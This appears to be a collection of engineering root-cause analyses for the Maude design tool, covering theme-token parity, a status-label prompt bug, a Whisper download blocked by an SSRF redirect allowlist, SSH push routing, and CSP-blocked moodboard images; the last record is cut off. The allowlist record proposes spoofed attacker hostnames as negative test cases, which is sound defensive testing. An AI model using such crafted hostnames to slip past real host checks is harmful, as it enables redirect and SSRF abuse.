decision.title: RCA: Ticket — světlý/tmavý režim se často vynechává při `/design:new` (regrese, 2026-07-08)
decision.rationale:
# RCA: Ticket — světlý/tmavý režim se často vynechává při `/design:new` (regrese, 2026-07-08)

_2026-07-08 · zdroj: ruční hlášení uživatele (tracker: github, bez čísla issue), s odkazem na `studyfi-design/.ai/logs/system-reviews/start-here-canvas-review.md` (Phase 1 "START HERE" system review, D4/D5) · vyšetřeno přímo (bez samostatné `/flow:bug-rca` fáze, ticket už obsahoval dostatek evidence) · uživatel: "uz se to jednou fixovalo" — bylo potvrzeno, že `themes[]`/V18 mechanismus existuje, ale byl od začátku mrtvý kód (viz níže)._

## Summary

Uživatel hlásí opakující se bug: `/design:new` v `studyfi-design` (samostatný projekt používající Maude) vygeneroval canvas, který v dark tématu vypadal správně, ale v light tématu měl téměř neviditelný text (`--fg-0` zamrzlé na dark hodnotě). Critic panel (design-system-keeper, signature-moment-critic) i post-write reality-check screenshot bug nechytily — chybu odhalil až uživatel ručním přepnutím tématu. DS (`studyfi-v3`) přitom explicitně deklaruje "both themes co-equal" jako hard rule. Toto NENÍ první výskyt — mechanismus, který měl dual-theme vynucovat (`config.themeDefault == "both"`, completeness-critic V18), v repu existoval už před tímto ticketem, ale byl **strukturálně nefunkční** (viz Root Cause) — takže "uz se to jednou fixovalo" ve skutečnosti znamená, že fix v minulosti přidal signál, ale zapomněl ho napojit na správné pole.

## Root Cause — tři vrstvy

### Vrstva 1 — mrtvá podmínka (proximate cause, proč enforcement nikdy nenaskočí)

`config.json`'s `themeDefault` pole má schema `enum: ["dark", "light"]` (`apps/studio/config.schema.json:47-52` a per-DS `:182-186`) — **nikdy nemůže nabýt hodnoty `"both"`**. Přesto:

- `plugins/design/skills/design-system/_bootstrap.md:632` (před fixem): "When `config.json.themeDefault == "both"`, emit both blocks…" — podmínka je vždy `false`.
- `plugins/design/agents/design-system-completeness-critic.md` V18 (před fixem): "IF `config.themeDefault == "both"`" — identická mrtvá podmínka, takže dual-theme block-existence check se nikdy nespustí.
- Q4 (discovery otázka, `_DISCOVERY-v1.md:57`) navíc odpovídá řetězcem `"both equal"`, ne `"both"` — i kdyby se podmínka opravila na správné pole, literál byl také špatně (`_MAPPING.md:1078` používal správný literál `both equal`, ale jen pro scaffold-time file-selection, ne pro perzistovaný config).

Ověřeno živě: `.design/config.json` v tomto repu (`maude` DS) MÁ `"themes": ["dark", "light"]` — tedy pole existuje ve schématu a v jednom reálném projektu je vyplněné — ale žádný consumer ho nikdy nečetl.

### Vrstva 2 — chybí strukturovaná persistence (proč signál chybí i tam, kde by měl existovat)

Reálný `studyfi-design/.design/config.json` (`studyfi-v3` DS) má v `description` prózu **"Both themes co-equal."**, ale **žádné pole `themes: [...]`**. Bootstrap flow zachytil Q4 odpověď jen jako volný text, ne jako strukturovaná hodnota — takže i kdyby V18 byl napojený na správné pole, `studyfi-v3` by dnes vypadal jako single-theme DS (žádný `themes[]` → V18 by nenaskočil).

### Vrstva 3 — i při existenci obou bloků chybí per-token parita (proximate cause samotného vizuálního bugu)

`plugins/design/templates/design-system-inspiration/core/colors_and_type.css.tpl` generuje canonical family tokeny (`--bg-0..4`, `--fg-0..3`, …) **jen jednou**, uvnitř `:root, .{{root_class}}[data-theme="{{theme_default}}"]` — bloky pro druhé téma jsou improvizované ad-hoc podle prozaické instrukce v `_bootstrap.md`, ne strukturální součást šablony. I `V18` (existence obou bloků) by tento konkrétní bug nechytilo — kontroluje jen, že OBA bloky EXISTUJÍ, ne že KAŽDÝ token z default bloku je v alternate bloku předefinovaný. `--fg-0` deklarovaný jen v `:root` se přes CSS cascade "dědí" všude, kde není explicitně přepsaný — vypadá to jako platná hodnota (žádná chyba, žádné console warning), ale je to zamrzlá barva ze špatného tématu.

### Proč to prošlo přes automatizované review

`/design:new` step 9 (post-write reality check) screenshotuje **jen JEDNO téma** (ať default, nebo cokoliv je canvas zrovna pinned) — žádný krok nikdy nevynutil druhý screenshot v alternativním tématu, ani když DS deklaruje "both co-equal" jako hard rule. Critic panel proto nikdy neviděl light-theme render.

## Impact

- **Kdo:** každý projekt s dual-theme DS (`themes.length > 1` nebo ekvivalentní "both equal" deklarace) — `/design:new` i implicitně `/design:edit`, kdykoliv se generuje/edituje token CSS nebo nový canvas.
- **Závažnost:** vysoká pro produktový slib "DS-first" a pro accessibility (near-invisible text = reálný a11y problém) — bez ztráty dat, bez security dopadu.
- **Workaround do teď:** ruční přepnutí tématu + vizuální kontrola po každém `/design:new` na dual-theme DS.

## Fix (implementováno v tomto commitu)

**A. Oprava mrtvé podmínky + persistence (delivery):**
1. `apps/studio/config.schema.json` — `designSystems[].themes` popsáno jako JEDINÝ autoritativní signál; `themeDefault` popis explicitně říká "nikdy `both`".
2. `plugins/design/skills/design-system/_bootstrap.md` — emission instrukce (§3 "Namespace + parameterization patterns") opravena: derivuje se ze surové Q4 odpovědi, vyjmenovává VŠECHNY family tokeny, které musí být v obou blocích, a **vyžaduje**, aby `themes[]` bylo vždy zapsáno do `config.json` (§ "Write `<designRoot>/config.json`") — ne jen do volné prózy.

**B. Gate (V18 oprava + nový V18c):**
3. `plugins/design/agents/design-system-completeness-critic.md` — V18 podmínka opravena na `designSystems[<ds>].themes.length > 1` (s prózovým fallbackem pro DS bootstrapnuté před tímto polem). Nový **V18c** (Core-tier blocker, když V18 naskočí): per-token diff mezi oběma bloky pro `--bg-0..4`/`--fg-0..3`/`--border-*` — přesně chytí `--fg-0`-frozen bug, který V18 samo o sobě nechytilo.

**C. Reality-check (`/design:new` step 9):**
4. `apps/studio/bin/screenshot.sh` + `_screenshot-playwright.mjs` — nový `--theme <name>` flag: vynutí `data-theme` na všech `[data-theme]` elementech přes DOM eval před capture.
5. `plugins/design/commands/new.md` step 1 — resolvuje `DS_THEMES`/`ALT_THEME` z `designSystems[<TARGET_DS>].themes`. Step 9 — když `ALT_THEME` existuje, běží druhý `--all-screens` capture pass s `--theme "$ALT_THEME"` do `_history/<slug>/theme-<name>/`, čte se OBOJÍ před tím, než se canvas považuje za vizuálně ověřený. FAIL handling zrcadlí existující primary-pass kontrakt (AskUserQuestion, ne silent-skip).
6. `plugins/design/skills/design/SKILL.md` — zrcadlená stručná verze pro sdílený "Post-write reality check" popis + config-table pointer.

## Známé omezení / follow-up mimo tento repo

Tento fix je **forward-looking** — opravuje mechanismus v Maude pluginu pro VŠECHNY budoucí `/design:setup-ds` (bootstrap i re-bootstrap) a `/design:new` běhy. **Nezpětně nepatchuje** už nabootstrapované DS, které `themes[]` nemají (např. `studyfi-design`'s `studyfi-v3` má dnes jen prózu "Both themes co-equal", ne strukturované pole) — dokud takový projekt nespustí `/design:setup-ds --force` (re-bootstrap), `/design:new` tam ALT_THEME capture nenaskočí (fallback je bezpečně no-op, ne crash). Fallback-grep v opraveném V18 (`/both theme|two.?theme|themes? co-equal/i` v README/description) toto částečně zmírní na completeness-critic úrovni, ale **doporučení pro `studyfi-design`**: ručně doplnit `"themes": ["dark","light"]` do `studyfi-v3` entry v `.design/config.json`, a zkontrolovat `colors_and_type.css`, že `--fg-0..3`/`--bg-0..4`/`--border-*` jsou skutečně předefinované v `[data-theme="light"]` bloku (ne jen v `:root`).

## Testing Requirements / co bylo ověřeno

Repo nemá test suite (markdown-plugin only) — verifikace proběhla staticky:

1. `bash -n` na `screenshot.sh` po úpravě — OK.
2. `node --check` na `_screenshot-playwright.mjs` po úpravě — OK.
3. JSON validita `config.schema.json` po úpravě — OK.
4. Simulace jq resolve logiky (`DS_THEMES`/`ALT_THEME`) proti reálnému `.design/config.json` tohoto repa (`maude` DS, `themes:["dark","light"]`) → `ALT_THEME=light` (správně).
5. Stejná simulace proti syntetickému legacy-DS configu bez `themes[]` (přesně tvar `studyfi-v3`) → `ALT_THEME=""` (bezpečný no-op, žádná regrese pro nedotčené projekty).
6. End-to-end dry-run step-9 bash bloku s mockovaným `maude` CLI — druhý capture pass se spustí se správnými flagy (`--theme light --out-dir …/theme-light`).
7. Živý smoke test `screenshot.sh --theme light` proti neběžícímu portu — flag se korektně parsuje a `apply_theme_override` hlásí `0 element(s)` bez pádu (očekávané chování bez živé stránky).

## Complexity

**Medium** — čistě instruction-markdown + JSON schema + bash/node helper (žádný React/dev-server kód). Riziko: fallback-grep pro pre-existující DS bez `themes[]` je heuristický, ne garantovaný — proto explicitní doporučení výše pro ruční backfill u `studyfi-design`.

decision.rationale:
# RCA: flow:status stále zobrazuje „GitHub tickets" po decouple refaktoru

## Summary

Archivovaný plán `decouple-flow-from-github-issues` byl dokončen: `status.md` má provider switch v Step 6 a display template říká „My open tickets: N total" (bez slova GitHub). Přesto model vypisuje `📊 Sprint: 0 open GitHub tickets assigned to me` — s kvalifikátorem „GitHub". Příčina: display instrukce v Step 6 je příliš stručná a model si kontext (právě spustil `gh issue list`) přenáší do popisku, i když šablona specifikuje neutrální „tickets".

## Root Cause

`plugins/flow/commands/status.md:228` říká:
```
- **My open tickets:** N total (skipped when `provider === none`)
```

`plugins/flow/commands/status.md:279` (Output Format) říká:
```
📊 Sprint:     8 open tickets assigned to me
```

Ale Step 6 je nadepsán `GitHub-only snippet:` (řádek 213) a obsahuje `gh issue list`. Model po provedení tohoto příkazu ví, že dotazoval GitHub — a „helpful" kvalifikátor „GitHub" přidá do výstupního popisku, i když šablona říká pouhé „tickets".

**Konkrétní mechanismus:** display instrukce `My open tickets: N total` neříká modelu *nezahrnovat* název providera do popisku. Kontext z právě spuštěného `gh issue list` převažuje nad implicitní neutrálností šablony.

Jde o **prompt design bug**: instrukce Task 3 z plánu změnila *text* display řádku z „issues" na „tickets", ale nepřidala explicitní zákaz kvalifikace — což stačí tehdy, kdy je provider `github` a model má v kontextu `gh issue list`.

## Impact

- Vizuální — Sprint řádek říká „GitHub tickets" místo „tickets" pro projekty s `provider: "github"`.
- Funkční dopad: nulový — správný `gh issue list` se spustí, počet je správný.
- Uživatelský dopad: pro non-GitHub projekty (ClickUp, Linear…) je display správný, protože tam se `gh issue list` nespustí. Chyba se projevuje pouze u `provider === "github"` projektů.

## Proposed Fix

Přidat jednu explicitní větu do display sekce Step 6 (`status.md:228`):

```markdown
### Display

- **📊 Sprint:** N open tickets assigned to me — vždy piš „tickets", nikdy „GitHub tickets" ani „ClickUp tickets" (provider se jinde v reportu zobrazuje jako kontext, ne v Sprint řádku).
```

Jednoduchá change: clarify instrukci tak, aby explicitní zákaz přebil model-side inferenci z kontextu.

## Testing Requirements

Po opravě:
1. Spustit `/flow:status` v projektu s `provider: "github"` — Sprint řádek musí říkat `open tickets assigned to me` (bez slova "GitHub").
2. Grep kontrola: `grep -n "GitHub tickets\|GitHub issues" plugins/flow/commands/status.md` → nula hitů mimo `provider === github` guardu.

## Complexity

Low — jednořádková změna textu v `status.md`.

decision.rationale:
# RCA: Ticket local-whisper-model-download-xet-redirect — "nejde mi stáhnout local subtitle model"

## Summary

Downloading any local whisper.cpp GGML model from the Settings panel fails immediately with `model download redirected off huggingface.co (cas-bridge.xethub.hf.co)`. Hugging Face has migrated large-file (LFS) blob serving for at least the `ggerganov/whisper.cpp` repo to its newer **Xet** storage backend, whose CDN edge nodes live under `*.xethub.hf.co` — a different domain than the classic `cdn-lfs.huggingface.co` this code was written and tested against. The SSRF-hardening redirect-host allowlist added in `downloadWhisperModel()` only accepts a final hostname matching `(^|\.)huggingface\.co$`, so every Xet-served redirect is (correctly, by its own narrow rule) rejected — the feature is 100% broken for any model repo HF has cut over to Xet, which currently appears to include `ggerganov/whisper.cpp`.

## Root Cause

`apps/studio/generation/whisper-models.ts:197-205` (`downloadWhisperModel`):

```ts
const res = await fetch(url, { signal, redirect: 'follow' });
const finalUrl = new URL(res.url || url);
if (finalUrl.protocol !== 'https:' || !/(^|\.)huggingface\.co$/.test(finalUrl.hostname))
  throw new Error(`model download redirected off huggingface.co (${finalUrl.hostname})`);
```

This check was added deliberately (commit `07ab3e16`, DDR-164, Task 2.7) in response to ethical-hacker Finding 2 during that feature's review: an open-redirect on HF's blob store must not let the fetch land on an arbitrary attacker/on-path host. At the time, HF's Git-LFS blob store redirected `huggingface.co/.../resolve/main/<file>` requests to `cdn-lfs.huggingface.co` — still under the `huggingface.co` apex, so the regex allowlist worked and the accompanying test (`whisper-models.test.ts:132`, "accepts a redirect that stays on a huggingface.co CDN host") pins exactly that host.

Hugging Face has since rolled out **Xet** — a new content-addressable storage backend that several repos (apparently including `ggerganov/whisper.cpp`) have been migrated onto. Xet-backed downloads 302-redirect to CAS edge nodes under **`xethub.hf.co`** (observed here: `cas-bridge.xethub.hf.co`), a completely different domain, not a subdomain of `huggingface.co`. The allowlist regex has no knowledge of this domain, so it throws the "redirected off huggingface.co" guard error on every attempt — this is the exact error and hostname the user reported, and it's not intermittent or user-environment-specific: it's an infrastructure change on HF's side that this code's fixed allowlist didn't anticipate.

This is a **legitimate-redirect-now-blocked** class of bug, not a logic error in the loop or a missing null-check — the security guard is doing exactly what it was written to do, against a host list that's now stale.

## Impact

- **Who**: any user attempting to download ANY local whisper.cpp model (Tiny/Base/Base-en/Small/Large-v3-Turbo) via the Settings panel — the entire "one-click local subtitles" feature (DDR-164) is unusable as long as `ggerganov/whisper.cpp` blobs are Xet-served.
- **Severity**: High for this specific feature (hard-fails 100% of the time, no partial degradation), but narrowly scoped — doesn't affect any other download path (ElevenLabs/Groq cloud transcription, asset fetch, etc.), since those don't route through this allowlist.
- **Workaround**: none inside the app. A user can manually place a `ggml-*.bin` file into the managed cache dir (`$XDG_CACHE_HOME/maude/whisper-models/` or `~/.cache/maude/whisper-models/`) fetched by other means, or pass `--model <path>` to `maude design transcribe` directly, bypassing the managed-download flow entirely.

## Proposed Fix

Extend the final-hop allowlist to accept HF's Xet CDN alongside the classic LFS CDN, rather than loosening it to "any host" (that would defeat the original SSRF hardening).

- **File**: `apps/studio/generation/whisper-models.ts`
  - Broaden the redirect-host check (currently `/(^|\.)huggingface\.co$/`) to also match `xethub.hf.co` and its subdomains, e.g. `/(^|\.)huggingface\.co$|(^|\.)xethub\.hf\.co$/`, or refactor into a small allowlist array of accepted apex domains checked with the same `(^|\.)<apex>$` subdomain-safe pattern (avoids the classic `evilhuggingface.co` / `huggingface.co.evil.com` string-matching trap — keep using `URL.hostname` + anchored regex, not `includes()`).
  - Update the doc comment above `downloadWhisperModel` (lines 165-174) that currently states "the redirect the HF blob store issues is followed... re-asserted https + a `*.huggingface.co` host" to describe both accepted CDN families and why (Xet migration).
  - No change needed to `MODEL_HOST`/`MODEL_REPO_PATH` (the initial request URL is unaffected — only the redirect target's host is new).
- Keep the `https:`-only protocol assertion as-is; Xet's CAS bridge is https.
- Consider whether the allowlist should be a small named constant (`ALLOWED_REDIRECT_APEXES`) so a future HF infrastructure change is a one-line diff instead of a regex edit — proportionate given this has now broken once.

## Testing Requirements

- Update `apps/studio/generation/whisper-models.test.ts`:
  - Add a case mirroring the existing "accepts a redirect that stays on a huggingface.co CDN host" test (line 132), but for a Xet host, e.g. `https://cas-bridge.xethub.hf.co/...` — must resolve successfully.
  - Keep the existing Finding-2 regression test (line 120, redirect to an attacker/on-path host) — must still throw. This guards against overcorrecting into an unbounded allowlist.
  - Add a negative case for a domain crafted to fool naive substring matching (e.g. `xethub.hf.co.evil.com` or `evilxethub.hf.co`) to confirm the anchored regex still rejects it.

## Complexity

Low — a one-line-ish allowlist widening plus a doc-comment update and two-to-three new test cases. No schema, route, or UI changes needed; the error surfaces through the existing `whisperDownload.error` state already wired in `http.ts`.

decision.rationale:
# RCA: maude desktop — publishing/merging to `main` on an **SSH remote** throws `unrecognized transport protocol: "ssh"`, and "Add to Shared version" pushes straight to `main` instead of opening a PR

**Date:** 2026-07-10
**Type:** Incident RCA — dev-server git layer (`apps/studio/git/service.ts`)
**Reported from:** `~/git/studyfi-design` (origin `git@github.com:StudyFi-Team/studyfi-design.git`), driving maude via the desktop app
**Severity:** **High** — every project cloned over SSH (the GitHub default for team repos) cannot Publish / Get-latest / Add-to-Shared from the maude UI. Silent for HTTPS clones, total block for SSH clones.
**Status:** Root cause proven; fix proposed (not yet implemented). Needs a small code fix (Issue A) + a product/DDR decision (Issue B).

## Summary

The user made a new draft + commit in the maude desktop app against `~/git/studyfi-design`, then tried to merge it into `main` and got:

```
Git remote "git@github.com:StudyFi-Team/studyfi-design.git" uses an unrecognized transport protocol: "ssh"
```

That is a raw **isomorphic-git** error. iso-git speaks **HTTP(S) only** — it cannot talk to an `ssh://` / `git@host:org/repo` remote. maude's git layer already knows this and routes SSH remotes to the system `git` binary for **fetch** and **ahead/behind** — but **push** and **pull** (and therefore "Add this draft to the Shared version", which calls push) were never given the same routing. They still hard-branch on the `MAUDE_USE_SYSTEM_GIT` env flag, which is **off by default**, so they fall into the iso engine and throw on any SSH remote.

Two distinct problems surfaced in one action:

- **Issue A (the error shown):** SSH publish/pull/merge is routed to iso-git → transport crash. **Bug.**
- **Issue B (the user's stated expectation "merge to main should always go via PR"):** maude's "Add to Shared version" does a **local merge into `main` + direct push to `main`** — there is **no pull-request flow anywhere in the codebase**. **Missing capability / product gap.**

(There is also a **separate, already-resolved** incident — the "Video start" dangling commit — documented at `~/git/studyfi-design/.ai/logs/rca/issue-maude-dangling-commit.md`. Cross-referenced below; not the subject of this RCA.)

## Root Cause

### Issue A — SSH not routed to system git on the write/network paths

maude runs git two ways (`apps/studio/git/service.ts:34-65`):

- **iso engine** (`isomorphic-git`) — the zero-setup default. **HTTP(S) only.**
- **system git** — the `git` binary via `Bun.spawn`. Speaks SSH, uses the user's own ssh-agent / credential helper.

There are two different switches deciding which engine runs:

| Switch | Meaning | Default on the user's Mac |
| --- | --- | --- |
| `USE_SYSTEM_GIT` (`:34`) | env `MAUDE_USE_SYSTEM_GIT` only | **`false`** (env unset) |
| `systemGitAvailable()` (`:56`) | is a `git` binary on `PATH`? | **`true`** (git 2.50.1 present) |

The **network read paths were hardened** (DDR-131 / DDR-133) to classify the remote URL and prefer system git whenever it exists *or* the remote is SSH:

- `gitFetchRemote` — `service.ts:1099`: `if ((await systemGitAvailable()) || transport === 'ssh') …`
- `remoteAheadBehind` — `service.ts:1628`: same guard.

But the **write/publish paths were left on the old hard-flag routing:**

- `gitPush` — `service.ts:882`: `return USE_SYSTEM_GIT ? pushSystem(...) : pushIso(...)`
- `gitPull` — `service.ts:994`: `return USE_SYSTEM_GIT ? pullSystem(...) : pullIso(...)`

Because `USE_SYSTEM_GIT` is `false` by default, `gitPush` → `pushIso` → `git.push({ http, … })` (`:896`). For an SSH remote, isomorphic-git throws `unrecognized transport protocol: "ssh"`. The engine comment at `:44-45` even states the design intent — *"iso remains the fallback … and still backs the WRITE paths (commit / checkout / branch / fold / push / pull) unless forced"* — which is fine for the purely-local writes (commit/checkout/branch) but **wrong for push/pull, which cross the network** and so must obey the same transport gate as fetch.

**Merge-to-main path:** the UI's "Add this draft to the Shared version" is `gitFoldDraft` (`service.ts:779`). It merges the draft into `main` locally, then calls `gitPush` at `:844`. So the fold reaches `pushIso` → SSH crash. That is exactly the gesture the user performed.

**Secondary defect — raw error leaked to the UI.** `gitFetchRemote` maps this class of error to friendly copy (`service.ts:1153`: `/unrecognized transport|unsupported|protocol/i` → *"Refresh needs the git command-line tool for this project's connection."*). `pushIso`'s catch (`:926-930`) has **no such mapping** — it returns `errMsg(e)` verbatim, which is why the user saw the raw iso-git string rather than a maude message.

**Why the existing test gave false confidence.** `test/git-branches.test.ts:187` — *"an ssh remote routes to system git, never the iso transport error"* — asserts exactly the right invariant, but only exercises **`gitFetchRemote`** (`:193`). There is **no equivalent test for `gitPush` / `gitPull` / `gitFoldDraft`**, so the untouched write paths passed CI while remaining broken for SSH.

**Evidence chain (conclusive, single cause — no competing hypothesis):**
1. `origin` is confirmed SSH: `git@github.com:StudyFi-Team/studyfi-design.git`.
2. `USE_SYSTEM_GIT` is `false` (env unset) → `gitPush` picks `pushIso`.
3. `pushIso` uses `isomorphic-git`, which is HTTP-only → throws `unrecognized transport protocol: "ssh"` — byte-for-byte the reported error.
4. `pushIso`'s catch doesn't map that message → raw string reaches the UI.
5. `gitFoldDraft` (merge-to-main) routes through `gitPush` → same crash.
6. Fetch works on the same repo because it *is* gated (`:1099`) — explaining why only publish/merge failed.

### Issue B — no PR flow; "Add to Shared version" pushes directly to `main`

Grep confirms **no pull-request creation exists** anywhere in `apps/studio` (no `/pulls`, no `pull_request`, no `createPullRequest`). `github/service.ts` exposes only `getIdentity` / `createRepo` / `setRemote` / `inviteCollaborator` / `listUserRepos`. `gitFoldDraft` therefore implements "merge to Shared version" as **local `git merge` into `main` + `git push origin main`** (`service.ts:798-844`).

Consequences for `StudyFi-Team/studyfi-design`:
- It structurally cannot honor the user's policy ("merge to main should always go through a PR").
- If `main` has **branch protection requiring PRs**, the direct push is **rejected by GitHub** regardless of transport. So even after Issue A is fixed, the same gesture would fail again — this time with a protected-branch push error that `isNonFastForward` (`:974`) doesn't recognize, so it too would surface as a raw/opaque push error.
- The configured `conventions.branchingModel` is literally `github-flow` (`.ai/workflows.config.json`) — a PR-based model — which the direct-push fold contradicts.

## Impact

- **Who:** every maude user whose project `origin` is an SSH URL — i.e. the GitHub default for most team/org repos. HTTPS clones are unaffected (iso-git handles those), which is why this wasn't caught earlier.
- **What breaks:** Publish, Get latest, and Add-to-Shared-version all throw the raw transport error. The user cannot ship work from the UI at all on an SSH remote.
- **Severity:** High. Complete block of the collaboration loop for SSH-cloned projects, with a raw, non-actionable error message.
- **Workarounds (today):**
  - Set `MAUDE_USE_SYSTEM_GIT=1` in the environment the sidecar runs under → forces system git everywhere (git 2.50.1 is present), which fixes transport but still pushes directly to `main` (Issue B remains).
  - Or switch the remote to HTTPS: `git -C ~/git/studyfi-design remote set-url origin https://github.com/StudyFi-Team/studyfi-design.git` (then Publish needs a signed-in GitHub token; still direct-to-`main`).
  - Or publish from a terminal: `git push origin <draft>` then open the PR on github.com by hand — the correct manual workflow until Issue B ships.

## Proposed Fix

### Issue A — apply the transport gate to push & pull (small, mirrors existing hardened paths)

In `apps/studio/git/service.ts`, make `gitPush` and `gitPull` classify the remote and prefer system git exactly like `gitFetchRemote` (`:1081-1099`) and `remoteAheadBehind` (`:1620-1628`) already do:

```ts
// inside gitPush (and symmetrically gitPull), before choosing the engine:
const url = await readRemoteUrl(dir, remote);
const transport = classifyRemoteUrl(url);
if (transport === 'unsafe')
  return { ok: false, error: 'Maude can only publish to github.com (HTTPS or SSH) projects.' };
const trustedHttp = transport === 'http' && isTrustedTokenHost(url);
if (transport === 'http' && !trustedHttp)
  return { ok: false, error: 'Maude can only publish to github.com projects.' };
// SSH, or any remote when a git binary exists → system engine (user's own creds).
if ((await systemGitAvailable()) || transport === 'ssh')
  return pushSystem(dir, trustedHttp ? token : undefined, remote, opts.ref);
return pushIso(dir, token, remote, opts.ref); // http-to-github fallback (no git binary)
```

`pushSystem` (`:933`) already handles both cases: token → `http.extraheader`; no token → the user's credential helper / ssh-agent. So the change is routing only; no new engine code.

**Belt (defense-in-depth):** add the same friendly mapping `gitFetchRemote` has to `pushIso`/`pullIso`'s catch — `if (/unrecognized transport|unsupported|protocol/i.test(msg)) return { ok:false, error:'Publishing needs the git command-line tool for this project\'s connection.' }` — so that even if a future path reaches iso with an SSH remote, the raw string never leaks.

Files: `apps/studio/git/service.ts` (`gitPush` `:874`, `gitPull` `:987`, `pushIso` catch `:926`, `pullIso` catch `:1020`). `gitFoldDraft` needs no change — it inherits the fix through `gitPush`.

### Issue B — merge-to-`main` MUST become a PR flow (mandatory for protected `main`; needs a DDR)

**Not optional.** For a repo whose `main` has branch protection requiring PRs — the `StudyFi-Team/studyfi-design` case, and the norm for any team repo — a direct push to `main` is **rejected by GitHub regardless of transport**. So fixing Issue A alone leaves the user with a *second* failure (protected-branch rejection). The only way "Add to Shared version" can work on a protected `main` is to open a **pull request**. maude has every primitive needed to do this today:

- **`parseGitHubRemote(url)`** (`github/endpoints.ts:71`) already extracts `owner/repo` from **both HTTPS and SSH** remotes (`git@github.com:owner/repo.git`), security-hardened to trust only literal `github.com`.
- **`withToken` / `getGithubToken`** (`github/endpoints.ts:129`, `token.ts`) already resolves the keychain PAT per request for every GitHub API call.
- **`api()` REST client** (`github/service.ts`) already makes authenticated calls (`createRepo` = `POST /user/repos`, invite = `PUT …/collaborators`). Adding `createPullRequest` = `POST /repos/{owner}/{repo}/pulls` is the identical shape.

**Why this sidesteps protection cleanly:** the **draft branch is not protected** (protection is on `main` only), so pushing the draft succeeds; and **PR creation is an HTTPS API call with the token — not a git push over SSH** — so it works even on an SSH-remote repo. The actual merge into `main` then happens **on GitHub**, after review/checks, exactly as protection intends — maude never merges `main` itself.

**Redesigned "Add to Shared version":**

```
repo has a GitHub remote?
  ├─ YES:  1. push the DRAFT branch to origin       (system git — Issue A; SSH ok; main untouched)
  │        2. POST /repos/{owner}/{repo}/pulls { head: <draft>, base: main, title: <draft> }
  │        3. surface the PR URL in the UI          (merge is resolved on GitHub, post-review)
  └─ NO (purely local project): keep today's local merge into main (no remote => no protection)
```

Work items:
- Add `createPullRequest(token, owner, repo, { head, base, title, body })` to `github/service.ts` (+ a `/_api/github/create-pr` endpoint via `withToken`, mirroring `createProject`).
- Rework `gitFoldDraft` (`git/service.ts:779`): when a GitHub remote exists → push draft + create PR (do **not** merge/push `main`); reuse the local merge only when there's no remote.
- UI: "Add to Shared version" → on success show "Pull request opened -> <link>"; keep the draft (don't delete it — the PR still references it).
- Map `422 "A pull request already exists"` and "no commits between base and head" to friendly copy; if the head branch has no upstream yet, push it first (covered by step 1).

**Optional minimal stopgap (only if the PR flow can't ship immediately):** detect a protected-branch rejection in `pushSystem` and surface *"`main` is protected — open a pull request to add your draft"* instead of a raw error. A signpost, **not** a substitute — it still leaves the user to open the PR by hand.

Recommendation: **A + B (PR flow) together is the real fix; both are needed.** A unblocks the transport (required for step 1's draft push and for Get-latest); B is what actually lands work on a protected `main`. Record a DDR for the fold-semantics change (direct-merge → PR), since it changes what a core gesture does and aligns maude with its own declared `github-flow` model.

### Cross-reference — the dangling-commit incident

`~/git/studyfi-design/.ai/logs/rca/issue-maude-dangling-commit.md` (separate, resolved) documents a maude-desktop commit that landed on an orphan ref invisible to the user's branch. It shares a theme with this RCA — **maude's git write-side doesn't land work where the user can act on it** — but has an independent mechanism (temp/worktree ref reset) and its own fix. Worth tracking both under one "harden maude's git write/publish surface" epic.

## Testing Requirements

- **New (the gap that let this ship):** clone-with-SSH-remote tests for **`gitPush`, `gitPull`, and `gitFoldDraft`**, mirroring `git-branches.test.ts:187` — assert `error` does **not** match `/unrecognized transport/i` and that the op routes to the system engine (use an `.invalid` SSH host so it fails fast at DNS, no network). This is the exact test that exists for fetch and is missing for the write paths.
- Regression: `USE_SYSTEM_GIT` unset + system git present + SSH remote → publish/pull/fold must **not** hit iso.
- Guard: `pushIso`/`pullIso` catch maps a transport error to friendly copy (assert no raw `unrecognized transport` string escapes).
- Issue B: unit-test `createPullRequest` request shape + friendly error mapping (mirror the existing `createRepo` test); integration-test that the fold opens a PR (draft→main) rather than pushing `main`.

## Complexity

- **Issue A (transport routing + error mapping + tests):** **Low.** ~15–25 lines mirroring code that already exists two functions away, plus 3 tests. Ship first.
- **Issue B option 2 (protected-branch detection + copy):** **Low.**
- **Issue B option 1 (real PR flow):** **Medium.** New REST endpoint + UI surface for the PR URL + a DDR for the model change.

decision.title: RCA: Moodboard / DS-specimen images render as empty "broken" thumbnails on a fresh repo
decision.rationale: # RCA: Moodboard / DS-specimen images render as empty "broken" thumbnails on a fresh repo _Source: manual paste via `/flow:bug-rca` (tracker provider `github`, but no issue number — args are the ticket body). Investigated 2026-07-06._ **Reporter's words (cs):** "nekdy se mi stává, když udělám úplně nové repo a v něm `design init` a `flow init` a potom vygeneruju nový design system, tak třeba v novém moodboardu podle `design:setup-ds` se nevyrenderují obrázky, které tam jsou vložené od AI agenta — i třeba do nových specimens v design systému. Prostě celkově se někdy stává, že jsou obrázky vložené, ale v canvasu vidím jen prázdný thumbnail, že obrázek neexistuje." ## Summary The moodboard (`/design:setup-ds` Stage 3) and DS specimens fill their photo slots with reference imagery the research agent gathers off the web. DDR-147 (2026-07-03) specced a **download-first** pipeline so that imagery renders deterministically: fetch each image to a local path and reference the local file, because a raw external `` hotlink is **blocked outright** by the canvas iframe's CSP (`img-src 'self' data: blob:`). **That fix never actually took effect, because its one mandatory dependency was never built.** Download-first is gated (by the spec itself, and by DDR-147 § "Security follow-up" item 1) behind a hardened `maude design fetch-asset` helper — and that helper **does not exist**. In its absence the spec explicitly routes back to the hotlink fallback. But the fallback is exactly what CSP blocks. So on a fresh repo, where no imagery is yet local, every photo slot resolves to a blocked external URL → the browser shows a broken/empty thumbnail (or, where the `` had an `onError`, a "scrap" placeholder). The DDR-147 addendum is inert prose. A second, compounding defect explains why the odd downloaded image _also_ fails: the canvas origin serves flat `/assets/` but **rejects nested `/assets/moodboard//`** — the exact subtree the spec tells writers to download into. ## Root Cause Three code-confirmed facts chain into the symptom. ### 1. The mandatory `maude design fetch-asset` helper was never implemented (primary cause) `plugins/design/skills/design-system/_bootstrap.md:366` and DDR-147 § Security follow-up item 1 both require download-first to go **only** through a hardened `maude design fetch-asset` helper, and both say verbatim: > "The download-first rule is **not safe to execute until this helper exists** … until then, prefer the `onError` hotlink-with-`img-src` fallback." > "**Until it exists, the spec routes to the `onError` hotlink fallback rather than agent-authored `curl`.**" The helper does not exist: - `apps/studio/bin/` has `asset-sweep.sh` but **no `fetch-asset.sh`**. - `cli/commands/design.mjs` verb allowlist is `screenshot · server-up · prep · slug · bootstrap-check · runtime-health · smoke · canvas-edit · handoff · asset-sweep · visual-sanity · draw-build · draw-proof · svg-optimize · to-lottie · read-annotations · annotate` — 